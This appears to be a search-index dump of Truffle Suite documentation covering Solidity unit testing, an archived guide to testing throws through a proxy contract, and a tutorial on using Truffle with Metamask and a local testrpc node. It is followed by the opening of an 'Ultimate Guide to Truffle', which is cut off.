a clean slate deployment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. In order to use the deployed contract, you'll have to import the contract code first. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract in a test function below to cast the address to the MetaCoin type. All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts, letting the test runner know it represents a test contract. Like test contract names, all test functions must start with test , all lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors. You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example test below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran. You do not need to extend from any Test contract like in other solidity testing frameworks. This is to make writing solidity unit tests easier, and should allow for more extensibility in the future with less hassle. Like Javascript tests, failing tests return the events that were fired (minus assertion events) so you can get a better sense of how your contracts-under-test performed.", "title": "Overview"}, {"location": "guides/testing-for-throws-in-solidity-tests/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! NOTE : This tutorial is written for versions of Solidity prior to v0.4.13. It relies on the deprecated `throw` keyword, now replaced by `revert()`, `require()`, and `assert()`. See Solidity documentation for error handling for more information. Truffle 3 brings forth Solidity unit testing, which means one can now test contracts in Solidity itself. This is a boon to contract developers, as there are several reasons why it's useful to have Solidity tests in addition to Truffle\u2019s Javascript tests. For us at Ujo , one of our biggest concerns is testing how contracts interact with each other, rather than just testing their interaction from a web3 perspective, and Solidity tests allow us to do that. Though Solidity tests can be quite powerful, they do come with some drawbacks. One of those is testing whether or not a function should throw (without breaking the test!), which I'll show you how to do right now. Diving In \u00b6 In Solidity, when performing a contract call that produces an error, Solidity automatically rethrows, meaning it will bubble that error up to the caller. However, with a raw call, the behavior is different: one can catch the error and decide what to do from there on out. If it throws (fails), it will return false . If it succeeds, it will return true . Thus, the following calls will produce a different result. // Returns false bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatThrows () \u201d )))); // Returns true bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatDoesNotThrow () \u201d )))); When calls are made this way, even if a sub-call fails, it won\u2019t automatically rethrow. In order to test for throws, one can either write out each call in the format above (which is cumbersome), or use a proxy contract to wrap the contract call to a raw call and return whether it succeeded or not. For our purposes, let's look at the example below, similar to a method I saw used by Dapple in a Tester contract. Note that these contracts will likely be placed in separate files within your Truffle project. Here, Thrower is the contract you're testing to see whether or not certain contracts throw , ThrowProxy is our helper and TestThrower is our test contract. The code is as follows: import \"truffle/Assert.sol\" ; // Proxy contract for testing throws contract ThrowProxy { address public target ; bytes data ; function ThrowProxy ( address _target ) { target = _target ; } //prime the data using the fallback function. function () { data = msg.data ; } function execute () returns ( bool ) { return target . call ( data ); } } // Contract you're testing contract Thrower { function doThrow () { throw ; } function doNoThrow () { // } } // Solidity test contract, meant to test Thrower contract TestThrower { function testThrow () { Thrower thrower = new Thrower (); ThrowProxy throwProxy = new ThrowProxy ( address ( thrower )); //set Thrower as the contract to forward requests to. The target. //prime the proxy. Thrower ( address ( throwProxy )). doThrow (); //execute the call that is supposed to throw. //r will be false if it threw. r will be true if it didn't. //make sure you send enough gas for your contract method. bool r = throwProxy . execute . gas ( 200000 )(); Assert . isFalse ( r , \u201c Should be false , as it should throw \u201d ); } } Perhaps the most interesting line is the following: Thrower ( address ( throwProxy )). doThrow (); This is telling Solidity to call the doThrow() function at the throwProxy address. Solidity automatically creates the necessary message data ( msg.data ) based on this call. Writing it like this, one would assume that at throwProxy there is a Thrower contract, but there isn\u2019t. There's a proxy instead. The proxy then receives the msg data, and since it doesn\u2019t have a doThrow() function, the fallback function is triggered in its place. The fallback function then saves the message data. After that, when executing the proxy, it then forwards the request onwards as a raw call, not a contract call. Since the throw would use up all the gas, the rest of the tests would legitimately OOG, so we restrict the gas sent through when calling the execute() method. Note that enough should be sent through so that it doesn\u2019t OOG legitimately and thus miss the actual throw condition. With this proxy, one can still effectively write the interactions as contracts calling other contracts without having to resort to crafting raw calls manually. (Hooray!) Gotchas \u00b6 An important caveat here is to recognize the contract caller, msg.sender . If you add a proxy in between, then msg.sender will be the proxy, which could break authorization and permissioning algorithms. If your authorization system allows you to change the owner, you can get around this constraint by setting the proxy to be the contract owner. For example: // Assume our contract under test has a changeOwner() function thrower . changeOwner ( address ( throwProxy )); // Perform test functions and assertions // ... // Restore previous owner Thrower ( address ( throwProxy )). changeOwner ( address ( this )); throwProxy . execute (); It\u2019s also important to know that this only tests throw 's at this particular level. For instance, if your contract call structure looked like the following: Test -> Proxy -> ContractToTest -> SomeOtherContract -> AnotherContractThatThrows Then you wouldn\u2019t know where the throw occurred, since SomeOtherContract and ContractToTest could just rethrow. It would be prudent to also ensure there isn\u2019t anything faulty in the proxy by creating a second test as a control. This test should be called with the appropriate gas and use the proxy to test a function where no throw occurs, just to make sure the proxy is setup and working as intended. Because a throw essentially uses up all gas, one must make doubly sure they catch the throw and not a legitimate out-of-gas (OOG) error. As well, take care to manage sending Ether through the proxy (for tests that require it) as that can be difficult as well. Conclusion \u00b6 Testing throws is possible from within Solidity tests, but can be cumbersome if you want to write those tests yourself as raw calls. You can get around this by using a proxy contract, which makes many situations a lot easier and makes your tests much easier to write. But keep a look out for potential caveats as Solidity tests with a lot more power but plenty of drawbacks. Happy developing! About Simon de la Rouviere Simon builds decentralised applications for use in the music industry, online communities and the developing world. He has been in the Bitcoin/blockchain space since 2011, developed a decentralised band around a full blown cryptocurrency, and is writing a book on the blockchain. More about Simon can be found on consensys.net .", "title": "Truffle Suite"}, {"location": "guides/testing-for-throws-in-solidity-tests/#diving-in", "text": "In Solidity, when performing a contract call that produces an error, Solidity automatically rethrows, meaning it will bubble that error up to the caller. However, with a raw call, the behavior is different: one can catch the error and decide what to do from there on out. If it throws (fails), it will return false . If it succeeds, it will return true . Thus, the following calls will produce a different result. // Returns false bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatThrows () \u201d )))); // Returns true bool result = address . call ( bytes4 ( bytes32 ( sha3 ( \u201c functionThatDoesNotThrow () \u201d )))); When calls are made this way, even if a sub-call fails, it won\u2019t automatically rethrow. In order to test for throws, one can either write out each call in the format above (which is cumbersome), or use a proxy contract to wrap the contract call to a raw call and return whether it succeeded or not. For our purposes, let's look at the example below, similar to a method I saw used by Dapple in a Tester contract. Note that these contracts will likely be placed in separate files within your Truffle project. Here, Thrower is the contract you're testing to see whether or not certain contracts throw , ThrowProxy is our helper and TestThrower is our test contract. The code is as follows: import \"truffle/Assert.sol\" ; // Proxy contract for testing throws contract ThrowProxy { address public target ; bytes data ; function ThrowProxy ( address _target ) { target = _target ; } //prime the data using the fallback function. function () { data = msg.data ; } function execute () returns ( bool ) { return target . call ( data ); } } // Contract you're testing contract Thrower { function doThrow () { throw ; } function doNoThrow () { // } } // Solidity test contract, meant to test Thrower contract TestThrower { function testThrow () { Thrower thrower = new Thrower (); ThrowProxy throwProxy = new ThrowProxy ( address ( thrower )); //set Thrower as the contract to forward requests to. The target. //prime the proxy. Thrower ( address ( throwProxy )). doThrow (); //execute the call that is supposed to throw. //r will be false if it threw. r will be true if it didn't. //make sure you send enough gas for your contract method. bool r = throwProxy . execute . gas ( 200000 )(); Assert . isFalse ( r , \u201c Should be false , as it should throw \u201d ); } } Perhaps the most interesting line is the following: Thrower ( address ( throwProxy )). doThrow (); This is telling Solidity to call the doThrow() function at the throwProxy address. Solidity automatically creates the necessary message data ( msg.data ) based on this call. Writing it like this, one would assume that at throwProxy there is a Thrower contract, but there isn\u2019t. There's a proxy instead. The proxy then receives the msg data, and since it doesn\u2019t have a doThrow() function, the fallback function is triggered in its place. The fallback function then saves the message data. After that, when executing the proxy, it then forwards the request onwards as a raw call, not a contract call. Since the throw would use up all the gas, the rest of the tests would legitimately OOG, so we restrict the gas sent through when calling the execute() method. Note that enough should be sent through so that it doesn\u2019t OOG legitimately and thus miss the actual throw condition. With this proxy, one can still effectively write the interactions as contracts calling other contracts without having to resort to crafting raw calls manually. (Hooray!)", "title": "Diving In"}, {"location": "guides/testing-for-throws-in-solidity-tests/#gotchas", "text": "An important caveat here is to recognize the contract caller, msg.sender . If you add a proxy in between, then msg.sender will be the proxy, which could break authorization and permissioning algorithms. If your authorization system allows you to change the owner, you can get around this constraint by setting the proxy to be the contract owner. For example: // Assume our contract under test has a changeOwner() function thrower . changeOwner ( address ( throwProxy )); // Perform test functions and assertions // ... // Restore previous owner Thrower ( address ( throwProxy )). changeOwner ( address ( this )); throwProxy . execute (); It\u2019s also important to know that this only tests throw 's at this particular level. For instance, if your contract call structure looked like the following: Test -> Proxy -> ContractToTest -> SomeOtherContract -> AnotherContractThatThrows Then you wouldn\u2019t know where the throw occurred, since SomeOtherContract and ContractToTest could just rethrow. It would be prudent to also ensure there isn\u2019t anything faulty in the proxy by creating a second test as a control. This test should be called with the appropriate gas and use the proxy to test a function where no throw occurs, just to make sure the proxy is setup and working as intended. Because a throw essentially uses up all gas, one must make doubly sure they catch the throw and not a legitimate out-of-gas (OOG) error. As well, take care to manage sending Ether through the proxy (for tests that require it) as that can be difficult as well.", "title": "Gotchas"}, {"location": "guides/testing-for-throws-in-solidity-tests/#conclusion", "text": "Testing throws is possible from within Solidity tests, but can be cumbersome if you want to write those tests yourself as raw calls. You can get around this by using a proxy contract, which makes many situations a lot easier and makes your tests much easier to write. But keep a look out for potential caveats as Solidity tests with a lot more power but plenty of drawbacks. Happy developing! About Simon de la Rouviere Simon builds decentralised applications for use in the music industry, online communities and the developing world. He has been in the Bitcoin/blockchain space since 2011, developed a decentralised band around a full blown cryptocurrency, and is writing a book on the blockchain. More about Simon can be found on consensys.net .", "title": "Conclusion"}, {"location": "guides/truffle-and-metamask/", "text": "Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation This article was originally written by Dan Finlay and published as a github gist . Dan has kindly allowed us to republish it here! If you're interested in building web apps with the Ethereum blockchain , you may have found the Truffle web framework to be a nice fit for your needs. For many types of Dapps (Distributed Apps), Truffle does everything you could want: It compiles your blockchain contracts, injects them into your web app, and can even run a test suite against them! This is all great for you, but what about your users? Truffle has some great defaults for users who are willing to run a local Ethereum JSON RPC server on their computer, but what about your users who just want to sign on and get started? With Metamask, all your users need to do is install our Chrome plugin , and they will have their own secure blockchain accounts right there in the convenience of their browsers. Metamask is just a Developer Preview right now, and has not been released to the general public. We don't recommend putting serious funds in it, but instead encourage you to use it to help prepare your dapps for Ethereum browsers. It's possible your Truffle Dapp is already compatible with Metamask, but if you're like me, you want to go through your project and see what it's like from your user's perspective. Just in case you haven't used Truffle before, I'm going to start by describing how to scaffold a minimal Truffle dapp. If you already have one set up, feel free to scroll ahead! Installing Truffle Dependencies \u00b6 You're going to need to have installed node.js . From there, you need to install truffle ( npm install -g truffle ). Also, you're going to need to run a local blockchain RPC server to test and develop against. I recommend using TestRPC , which you install by running npm install -g ethereumjs-testrpc . Next let's make sure we have our testrpc running in the background. Open your terminal and run the command testrpc . That's all! It runs on port 8545 by default, just like most Ethereum RPCs, and so does Truffle. Quick Note on RPCs \u00b6 Ethereum RPCs can run in a pre-authenticated mode, that allows you to perform transactions without providing any additional credentials. Obviously this would be a dangerous thing to do on the open web, but for local development, it's the default method that testrpc provides. When you first start testrpc , You get a list of initial accounts. These accounts start funded with a whole lot of Ether, so you can practice exchanging funds between accounts. When you open a normal Truffle Dapp, it takes advantage of your local authenticated rpc, and has access to its account list. The default Truffle dapp just uses the first account in the list. Setting up a Simple Truffle Dapp \u00b6 Next, let's generate a basic Truffle dapp. The default result of truffle init is a simple example currency. To get it up and running, run these commands: mkdir my-money # Create a folder for your new dapp cd my-money # Move into that folder truffle init # Initialize a default truffle project in that folder truffle build # Compile the dapp truffle migrate # Publish the dapp on the blockchain truffle serve # Host your web interface on port 8080 We just deployed a simple alt-coin called MetaCoin to our local blockchain, and it's available to our browser on http://127.0.0.1:8080 ! If you visit it, you'll see that by default this new Dapp template signs you in with the first account on your testrpc account list, which happens to be the same account that got pre-populated with 10k shiny new Metacoins! That's because when you ran truffle migrate , Truffle used your first account as the contract publisher, and the contract says to fund the creator's account with 10k coins. If you don't see any Metacoin in this account, it may be because you have Metamask already installed. Jump down to \"Switching between TestRPC and Metamask accounts\" below. You can now send those coins to any account you want, so let's now set up some Metamask accounts, and then we can fund them! Setting up Metamask \u00b6 Now you'll want to install Metamask from the Chrome store . Metamask is currently not listed on the Chrome store, but you get that link because you're an early adopter who we want to support. When first setting up Metamask, you'll need to provide a password (used to encrypt your wallet). It is then going to generate a unique twelve-word phrase that you'll eventually be able to use to recover all your accounts.We haven't done that yet because this is just a developer preview! Please don't use Metamask for important things yet! By default you get three accounts, all named Wallie. Again, our developer preview is showing. Eventually we're planning to integrate rich persona management via uPort !). To use Metamask with your local development blockchain, you need to point it at your testrpc . Open Metamask Click the gear icon in the bottom left Enter your testrpc address into the RPC field. It's probably http://127.0.0.1:8545/ . Metamask will close at this point to restart itself. You can now sign into the dapp with Metamask. Open Metamask Enter your password Select an account Reload the Dapp page (some dapps will notice when you change accounts, but this basic one doesn't) You might notice you don't have any Metacoin in this account. That's a good thing! It means your new currency isn't going out to random accounts on the internet! To send some Metacoin to one of your Metamask accounts, you're going to need that account's address. To copy a Metamask account's address: Open Metamask Click the details arrow next to the account whose address you want. Click the \"Copy Address\" button. You now you have a copy of your address to send to! Switching Between TestRPC and Metamask Accounts \u00b6 When Metamask is installed, it intercepts calls and transactions to the Ethereum blockchain, and forwards them to its own RPC (which is currently on the test-network by default). Since Metamask is managing ethereum connections when it's installed, our Chrome browser right now can't access our testrpc accounts, because those accounts are managed by the testrpc node itself, so we need to open a browser without metamask. The easiest way to do this is to open an incognito window. You can also open another browser. Funding Your Metamask Account \u00b6 Once you're connected to your testrpc accounts again, you can send your Metacoin to whoever you please, including your new Metamask accounts. You might also notice that your new Metamask accounts don't have any ether in them. The testrpc initializes the blockchain with just its starting accounts having any balance, so to fund a Metamask account, you need to send some Ether to those accounts from one of your testrpc accounts. (In a future version of TestRPC there will probably be better ways to do this ). Here's a simple shell command to tell your testrpc to send 1 ether to your Metamask account. Let's assume 0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3 is the first account in your testrpc list, and 0xbbd220f66e989a493c4d48531ea1e283abc385de is one of your Metamask accounts. 1e18 is equal to 1 ether, which will be more than enough for our purposes. curl -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\": [{\"from\":\"0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3\", \"to\":\"0xbbd220f66e989a493c4d48531ea1e283abc385de\", \"value\": 1e18}], \"id\":1}' -X POST http://127.0.0.1:8545/ Synchronizing Accounts Between Metamask And Testrpc \u00b6 If you want to use testrpc/Metamask combination for development purposes, another route to get the accounts in Metamask to be useful with testrpc is to use the HD wallet generation that both support. If you start testrpc it creates 10 different addresses that can be recovered by the supplied mnemonic. The `testrpc output show the 10 initial accounts, the 10 private keys for the accounts and the mnemonic to recreate those accounts. Available Accounts ================== (0) 0x0b488d56e55996ea868e6bc640a59d10c71ff4e7 ... (9) 0x4decace9430b32cfd72ed99656adf80ebf23931d Private Keys ================== (0) cb99e7dfaf138af48dde4e863f6dca0ab0acfad29f95954f08796f962656d5c8 ... (9) 29f734be35466ed5a62d0c7387412bc73d533bc24197cdcf2b8bbac8a982b198 HD Wallet ================== Mnemonic: rubber negative firm purity helmet barely six asset imitate nephew october pluck Base HD Path: m/44'/60'/0'/0/{account_index} If you use that mnemonic in Metamask to restore an existing vault instead of creating a new one Metamask will use the same accounts. Testrpc also support a command line option to supply the mnemonic instead of using a random one. Starting it with testrpc -m \"rubber negative firm purity helmet barely six asset imitate nephew october pluck\" will give you the same accounts each time. That way you don't have to setup Metamask every time to use a new mnemonic. Sending Metacoin from Metamask: So Meta! \u00b6 Now if we connect to our Dapp via Metamask, we should see we have some MetaCoin, and if we look in our Metamask plugin, we should have 1 ether too! It's important that we have ether, because it's not only a currency for trade, it's also the currency for processing transactions on the Ethereum blockchain. This processing fee is referred to as \"gas\". Let's try sending some Metacoin from one of our Metamask accounts to another. First select the account that has the Metacoin and Ether. Now click the details arrow for another account, and copy its address ( COPY ADDR ). Paste the address into the Dapp window, along with how much Metacoin you'd like to send, and hit send ! You should see a notification pop-up, notifying you that you have a transaction to approve in Metamask. You can either click \"Approve\" on the notification, or open the Metamask pop-up and review the transaction there. This is one way that Metamask is a safer Ethereum browsing experience than running your own RPC. While a pre-authenticated RPC automatically approves all requests sent to it, Metamask gives the user an opportunity to review and approve or reject each transaction that's requested by the dapp. Long term, making transactions easy to intelligently review is an important priority for Ethereum developers. Wrapping Up \u00b6 This has been a simple example, but hopefully shows how Truffle and Metamask work together. They are able to pretty much work out of the box! That's because Truffle helps you write web3 -compliant dapps. Web3 is a Javascript API declared by the core Ethereum team, and since it was standardized early, tools that take advantage of its common methods work well together. This makes connecting to a Truffle Dapp with Metamask not much harder than connecting via your own RPC, but it's a lot easier for your users. That's because Metamask is a hyper-light client that doesn't replicate the entire blockchain locally, but it does let users manage their own accounts, so they can casually benefit from the security of private key management, while placing trust for block validation on Metamask's configured RPC provider. We hope this has been a useful introduction to developing with Truffle and Metamask! Please, leave a comment or question, start a discussion on github , or Tweet at us on Twitter . We're trying to make Metamask the easiest tool to let anyone benefit from using Distributed Apps on the Ethereum Blockchain.", "title": "Truffle Suite"}, {"location": "guides/truffle-and-metamask/#installing-truffle-dependencies", "text": "You're going to need to have installed node.js . From there, you need to install truffle ( npm install -g truffle ). Also, you're going to need to run a local blockchain RPC server to test and develop against. I recommend using TestRPC , which you install by running npm install -g ethereumjs-testrpc . Next let's make sure we have our testrpc running in the background. Open your terminal and run the command testrpc . That's all! It runs on port 8545 by default, just like most Ethereum RPCs, and so does Truffle.", "title": "Installing Truffle Dependencies"}, {"location": "guides/truffle-and-metamask/#quick-note-on-rpcs", "text": "Ethereum RPCs can run in a pre-authenticated mode, that allows you to perform transactions without providing any additional credentials. Obviously this would be a dangerous thing to do on the open web, but for local development, it's the default method that testrpc provides. When you first start testrpc , You get a list of initial accounts. These accounts start funded with a whole lot of Ether, so you can practice exchanging funds between accounts. When you open a normal Truffle Dapp, it takes advantage of your local authenticated rpc, and has access to its account list. The default Truffle dapp just uses the first account in the list.", "title": "Quick Note on RPCs"}, {"location": "guides/truffle-and-metamask/#setting-up-a-simple-truffle-dapp", "text": "Next, let's generate a basic Truffle dapp. The default result of truffle init is a simple example currency. To get it up and running, run these commands: mkdir my-money # Create a folder for your new dapp cd my-money # Move into that folder truffle init # Initialize a default truffle project in that folder truffle build # Compile the dapp truffle migrate # Publish the dapp on the blockchain truffle serve # Host your web interface on port 8080 We just deployed a simple alt-coin called MetaCoin to our local blockchain, and it's available to our browser on http://127.0.0.1:8080 ! If you visit it, you'll see that by default this new Dapp template signs you in with the first account on your testrpc account list, which happens to be the same account that got pre-populated with 10k shiny new Metacoins! That's because when you ran truffle migrate , Truffle used your first account as the contract publisher, and the contract says to fund the creator's account with 10k coins. If you don't see any Metacoin in this account, it may be because you have Metamask already installed. Jump down to \"Switching between TestRPC and Metamask accounts\" below. You can now send those coins to any account you want, so let's now set up some Metamask accounts, and then we can fund them!", "title": "Setting up a Simple Truffle Dapp"}, {"location": "guides/truffle-and-metamask/#setting-up-metamask", "text": "Now you'll want to install Metamask from the Chrome store . Metamask is currently not listed on the Chrome store, but you get that link because you're an early adopter who we want to support. When first setting up Metamask, you'll need to provide a password (used to encrypt your wallet). It is then going to generate a unique twelve-word phrase that you'll eventually be able to use to recover all your accounts.We haven't done that yet because this is just a developer preview! Please don't use Metamask for important things yet! By default you get three accounts, all named Wallie. Again, our developer preview is showing. Eventually we're planning to integrate rich persona management via uPort !). To use Metamask with your local development blockchain, you need to point it at your testrpc . Open Metamask Click the gear icon in the bottom left Enter your testrpc address into the RPC field. It's probably http://127.0.0.1:8545/ . Metamask will close at this point to restart itself. You can now sign into the dapp with Metamask. Open Metamask Enter your password Select an account Reload the Dapp page (some dapps will notice when you change accounts, but this basic one doesn't) You might notice you don't have any Metacoin in this account. That's a good thing! It means your new currency isn't going out to random accounts on the internet! To send some Metacoin to one of your Metamask accounts, you're going to need that account's address. To copy a Metamask account's address: Open Metamask Click the details arrow next to the account whose address you want. Click the \"Copy Address\" button. You now you have a copy of your address to send to!", "title": "Setting up Metamask"}, {"location": "guides/truffle-and-metamask/#switching-between-testrpc-and-metamask-accounts", "text": "When Metamask is installed, it intercepts calls and transactions to the Ethereum blockchain, and forwards them to its own RPC (which is currently on the test-network by default). Since Metamask is managing ethereum connections when it's installed, our Chrome browser right now can't access our testrpc accounts, because those accounts are managed by the testrpc node itself, so we need to open a browser without metamask. The easiest way to do this is to open an incognito window. You can also open another browser.", "title": "Switching Between TestRPC and Metamask Accounts"}, {"location": "guides/truffle-and-metamask/#funding-your-metamask-account", "text": "Once you're connected to your testrpc accounts again, you can send your Metacoin to whoever you please, including your new Metamask accounts. You might also notice that your new Metamask accounts don't have any ether in them. The testrpc initializes the blockchain with just its starting accounts having any balance, so to fund a Metamask account, you need to send some Ether to those accounts from one of your testrpc accounts. (In a future version of TestRPC there will probably be better ways to do this ). Here's a simple shell command to tell your testrpc to send 1 ether to your Metamask account. Let's assume 0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3 is the first account in your testrpc list, and 0xbbd220f66e989a493c4d48531ea1e283abc385de is one of your Metamask accounts. 1e18 is equal to 1 ether, which will be more than enough for our purposes. curl -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\": [{\"from\":\"0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3\", \"to\":\"0xbbd220f66e989a493c4d48531ea1e283abc385de\", \"value\": 1e18}], \"id\":1}' -X POST http://127.0.0.1:8545/", "title": "Funding Your Metamask Account"}, {"location": "guides/truffle-and-metamask/#synchronizing-accounts-between-metamask-and-testrpc", "text": "If you want to use testrpc/Metamask combination for development purposes, another route to get the accounts in Metamask to be useful with testrpc is to use the HD wallet generation that both support. If you start testrpc it creates 10 different addresses that can be recovered by the supplied mnemonic. The `testrpc output show the 10 initial accounts, the 10 private keys for the accounts and the mnemonic to recreate those accounts. Available Accounts ================== (0) 0x0b488d56e55996ea868e6bc640a59d10c71ff4e7 ... (9) 0x4decace9430b32cfd72ed99656adf80ebf23931d Private Keys ================== (0) cb99e7dfaf138af48dde4e863f6dca0ab0acfad29f95954f08796f962656d5c8 ... (9) 29f734be35466ed5a62d0c7387412bc73d533bc24197cdcf2b8bbac8a982b198 HD Wallet ================== Mnemonic: rubber negative firm purity helmet barely six asset imitate nephew october pluck Base HD Path: m/44'/60'/0'/0/{account_index} If you use that mnemonic in Metamask to restore an existing vault instead of creating a new one Metamask will use the same accounts. Testrpc also support a command line option to supply the mnemonic instead of using a random one. Starting it with testrpc -m \"rubber negative firm purity helmet barely six asset imitate nephew october pluck\" will give you the same accounts each time. That way you don't have to setup Metamask every time to use a new mnemonic.", "title": "Synchronizing Accounts Between Metamask And Testrpc"}, {"location": "guides/truffle-and-metamask/#sending-metacoin-from-metamask-so-meta", "text": "Now if we connect to our Dapp via Metamask, we should see we have some MetaCoin, and if we look in our Metamask plugin, we should have 1 ether too! It's important that we have ether, because it's not only a currency for trade, it's also the currency for processing transactions on the Ethereum blockchain. This processing fee is referred to as \"gas\". Let's try sending some Metacoin from one of our Metamask accounts to another. First select the account that has the Metacoin and Ether. Now click the details arrow for another account, and copy its address ( COPY ADDR ). Paste the address into the Dapp window, along with how much Metacoin you'd like to send, and hit send ! You should see a notification pop-up, notifying you that you have a transaction to approve in Metamask. You can either click \"Approve\" on the notification, or open the Metamask pop-up and review the transaction there. This is one way that Metamask is a safer Ethereum browsing experience than running your own RPC. While a pre-authenticated RPC automatically approves all requests sent to it, Metamask gives the user an opportunity to review and approve or reject each transaction that's requested by the dapp. Long term, making transactions easy to intelligently review is an important priority for Ethereum developers.", "title": "Sending Metacoin from Metamask: So Meta!"}, {"location": "guides/truffle-and-metamask/#wrapping-up", "text": "This has been a simple example, but hopefully shows how Truffle and Metamask work together. They are able to pretty much work out of the box! That's because Truffle helps you write web3 -compliant dapps. Web3 is a Javascript API declared by the core Ethereum team, and since it was standardized early, tools that take advantage of its common methods work well together. This makes connecting to a Truffle Dapp with Metamask not much harder than connecting via your own RPC, but it's a lot easier for your users. That's because Metamask is a hyper-light client that doesn't replicate the entire blockchain locally, but it does let users manage their own accounts, so they can casually benefit from the security of private key management, while placing trust for block validation on Metamask's configured RPC provider. We hope this has been a useful introduction to developing with Truffle and Metamask! Please, leave a comment or question, start a discussion on github , or Tweet at us on Twitter . We're trying to make Metamask the easiest tool to let anyone benefit from using Distributed Apps on the Ethereum Blockchain.", "title": "Wrapping Up"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/", "text": "Ultimate Guide to Truffle: The Gateway to Full Stack Blockchain Development \u00b6 Written by Kingsley Arinze Last updated 05/03/2023 The Ultimate Guide to Truffle showcases everything developers need to get started using Truffle for blockchain development, providing an overview of core features such as Truffle Dashboard, Command Line Interface, VS Code, and Ganache. Overview \u00b6 The Ultimate Guide to Truffle introduces all the components of Truffle to get started building full stack blockchain applications. Truffle is a suite of development environment tooling for web3 developers to simplify the development lifecycle for EVM-based applications. It was the first development environment software created for Ethereum and has existed since 2015. This guide covers Truffle's library-first approach, touching on the fundamental building blocks of Truffle and how it's composed for building blockchain applications. The benefits of building with the Truffle Suite are outlined and ways to use Truffle together with other tools. Finally, the guide covers the tools within the Truffle Suite, how each functions to improve your development process, and how to get started using them. Index: Part 1: What is Truffle? Part 2: The Benefits of Building with Truffle Part 3: Truffle Suite Core Features and Tooling Part 4: Truffle Command Line Interface Part 5: Truffle Dashboard Part 6: Ganache Part 7: Truffle for VS Code Extension Part one: What is Truffle? \u00b6 Truffle is a collection of tools that simplifies the development of blockchain-based applications on EVM-compatible networks. It includes tooling to help you, the developer, throughout your development cycle, from coding and testing to debugging and deployment. Truffle focuses on the development of smart contracts, which are the foundation of EVM applications. It also includes tools for developing front-end applications that interact with smart contracts and a comprehensive suite of testing and debugging tools. This allows developers to quickly and easily build and test their applications, reducing development time and increasing the reliability of the final product. At its core, Truffle is made up of free and open-source software (FOSS) libraries. These libraries are built to be platform agnostic and interoperable, meaning they can be plugged into other tools fairly easily e.g. @truffle/fetch-and-compile , @truffle/codec , and @truffle/debugger . Each library is assembled to form tools like Truffle\u2019s CLI (command-line interface), Truffle Dashboard, Truffle Debugger, Truffle for VS Code extension, and Ganache. Together, these make up the Truffle Suite of tools. Part two: The Benefits of Building with Truffle \u00b6 Truffle allows developers to code, test, debug, and deploy smart contracts to Ethereum and other EVM-compatible blockchain networks. Here are some benefits that make Truffle a standout in the Ethereum ecosystem: Insight into Transaction Details: Truffle Dashboard lets you inspect transactions before they occur by giving you more digestible information to more confidently approve or reject transactions. Diagnose and fix errors quickly: The Truffle Debugger together with Truffle\u2019s testing suite allows you to surgically diagnose errors when they occur and fix them quickly Focus on your dapp\u2019s uniqueness: Truffle offers a workflow that gets out of your way and lets you focus on your dapp\u2019s unique functionality. It\u2019s prescriptive enough to provide guidance, yet flexible enough to adapt to your needs. Operate safely: With Ganache\u2019s zero-config mainnet forking, you can easily test against live networks without spending real Ether. You can execute risky transactions in a sandbox and test integrations with production smart contracts, all with the same human-readable information and debugging tools you use for development networks. Applicable at all stages of development: Regardless of whether your project began with Truffle CLI or another framework, Truffle can provide tooling and insights. We also support a number of different protocols and offer the ability to easily add support for new ones. Part three: Truffle Suite Core Features and Tooling \u00b6 As mentioned earlier, Truffle isn\u2019t a single tool, but a suite of tools that come together to create a smooth development experience. These tools include Truffle CLI, Truffle Dashboard, Ganache, and Truffle for VS code. Before we delve into each of these tools, their features, and how you can start using them, let's review the underlying libraries that power these tools. A. Truffle Debugger ( @truffle/debugger ) is a portable Solidity debugger library that can be used with or without Truffle. It is a standalone package that is available on NPM, which means that anyone can install this library and use it as is, or build on it to offer an even better experience. Truffle\u2019s debugger is at the heart of every Truffle tool including Truffle CLI, and Truffle for VS Code with plans to integrate it into Truffle Dashboard. Some of its features are: Solidity stepping and breakpoints Variable inspection Watch expressions Rudimentary support for Vyper and more! B. Truffle Encoder & Decoder ( @truffle/codec ) library provides an interface for decoding Solidity smart contract state and information sent to, or from smart contracts using the Solidity ABI. It produces output in a machine-readable form that avoids losing any information. This is a low-level package for encoding, decoding, and data representation. C. Truffle Fetch & Compile ( @truffle/fetch-and-compile ) is a library that is used to obtain externally verified sources and compile them. It is important to note that, while these libraries form the core of Truffle, they can be used stand-alone or together with other tools within the ecosystem. Let\u2019s take a deeper look at some of the user-facing tools within the Truffle Suite and how to get started with 